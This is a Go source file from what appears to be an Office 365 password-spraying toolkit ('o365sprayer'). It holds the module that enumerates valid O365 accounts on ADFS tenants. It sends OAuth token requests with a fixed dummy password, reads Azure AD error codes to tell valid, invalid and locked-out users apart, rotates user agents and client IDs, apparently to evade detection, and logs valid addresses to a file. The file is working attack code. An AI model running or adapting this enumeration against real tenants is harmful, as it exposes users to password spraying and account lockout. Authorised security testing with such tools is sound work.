package enum

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/securebinary/o365sprayer/o365sprayer/constants"
	"github.com/securebinary/o365sprayer/o365sprayer/logging"

	"github.com/fatih/color"
)

var countADFS = 0

func counterADFS() {
	countADFS += 1
}

var lockedAccounts = 0

func accountLocked() {
	lockedAccounts += 1
}

func ValidateEmailADFSO365(command string, email string, file *os.File) {
	getOauthTokenRequestJSON := url.Values{}
	getOauthTokenRequestJSON.Add("resource", constants.RESOURCES[rand.Intn(len(constants.RESOURCES))])
	getOauthTokenRequestJSON.Add("client_id", constants.CLIENT_IDS[constants.GetMapItemRandKey(constants.CLIENT_IDS)])
	getOauthTokenRequestJSON.Add("grant_type", constants.GRANT_TYPE)
	getOauthTokenRequestJSON.Add("scope", constants.SCOPES[rand.Intn(len(constants.SCOPES))])
	getOauthTokenRequestJSON.Add("username", email)
	getOauthTokenRequestJSON.Add("password", "Pass@1234")
	client := &http.Client{}
	req, err := http.NewRequest("POST", constants.GET_OAUTH_TOKEN, strings.NewReader(getOauthTokenRequestJSON.Encode()))
	req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	var getOauthTokenResponseJSON constants.GetOauthTokenResponseJSON
	json.Unmarshal(body, &getOauthTokenResponseJSON)
	if resp.StatusCode == 200 {
		go counterADFS()
		color.Green("[*] Valid User : " + email)
	}

	checkError := false
	if len(getOauthTokenResponseJSON.ErrorCodes) > 0 {
		checkError = true
	}
	if checkError {
		if getOauthTokenResponseJSON.ErrorCodes[0] == 50053 {
			go accountLocked()
			color.Cyan("[*] Account Locked Out : " + email)
		}
		if getOauthTokenResponseJSON.ErrorCodes[0] == 50126 {
			go counterADFS()
			color.Green("[*] Valid User : " + email)
			logging.LogEnumeratedAccount(file, email)
		}
		if command == "standalone" && (getOauthTokenResponseJSON.ErrorCodes[0] != 50126 && getOauthTokenResponseJSON.ErrorCodes[0] != 50053 && resp.StatusCode != 200) {
			color.Red("[-] Invalid User : " + email)
		}
	}
}

func EnumEmailsADFSO365(domainName string, command string, email string, filepath string, delay float64) {
	color.Yellow("[+] Enumerating Valid O365 Emails - ADFS")
	timeStamp := strconv.Itoa(time.Now().Year()) + strconv.Itoa(int(time.Now().Month())) + strconv.Itoa(int(time.Now().Hour())) + strconv.Itoa(int(time.Now().Minute())) + strconv.Itoa(int(time.Now().Second()))
	fileName := domainName + "_enum_" + timeStamp
	logFile, err := os.OpenFile((fileName), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Could not open " + fileName)
		return
	}
	defer logFile.Close()
	if command == "standalone" {
		ValidateEmailADFSO365(command, email, logFile)
	}
	if command == "file" {
		file, err := os.Open(filepath)
		if err != nil {
			log.Fatal(err)
		}
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			ValidateEmailADFSO365(command, scanner.Text(), logFile)
			time.Sleep(time.Duration(delay))
		}
		if err := scanner.Err(); err != nil {
			log.Fatal(err)
		}
		if countADFS > 0 {
			color.Yellow("[+] " + strconv.Itoa(countADFS) + " Valid O365 Emails Found !")
		} else {
			color.Red("[-] No Valid O365 Email Found !")
		}
	}
}
